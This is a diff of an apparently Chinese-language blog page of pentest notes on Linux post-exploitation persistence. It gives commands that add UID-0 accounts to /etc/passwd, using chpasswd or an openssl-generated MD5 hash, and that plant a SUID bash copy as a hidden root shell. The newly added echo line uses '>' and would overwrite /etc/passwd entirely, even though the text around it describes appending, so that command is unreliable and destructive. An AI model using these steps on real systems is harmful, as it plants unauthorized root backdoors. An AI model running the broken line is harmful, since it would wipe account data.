@@ -200,6 +200,7 @@ color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br><span class="line">echo &#x27;guest:123456&#x27;|chpasswd</span><br></pre></td></tr></table></figure>
 <p>实际测试中发现添加用户后，passwd文件中就存在那一条数据了，再写的话，修改不了权限，所以我这里先添加数据到passwd中，再添加用户（或者修改密码）</p>
 <p><img src="image-20210608171347277.png" alt="image-20210608171347277"></p>
+<p>除此之外，还有一个方式添加新用户，<br>先对密码就行加密<br>openssl passwd -1 -salt admin admin<br>-1 的意思是使用md5加密算法<br>-salt 自动插入一个随机数作为文件内容加密，默认选项 加点盐：<br>得到密文后，拼接为一条消息，写入到passwd文件中，这样子就不需要chpasswd了<br>    admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash<br>    echo ‘admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash’ &gt; /etc/passwd</p>
 <p>有些时候添加不成功是因为用户策略可以适当加强密码强度<br>有些也会限制root权限用户远程登录</p>
 <h2 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h2><p>提权后，cp /bin/bash /.test<br>chmod 4755 /.test<br>之后以普通用户运行<br>/.test -p</p>
 <p><img src="image-20210608172859611.png" alt="image-20210608172859611"><br>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p>
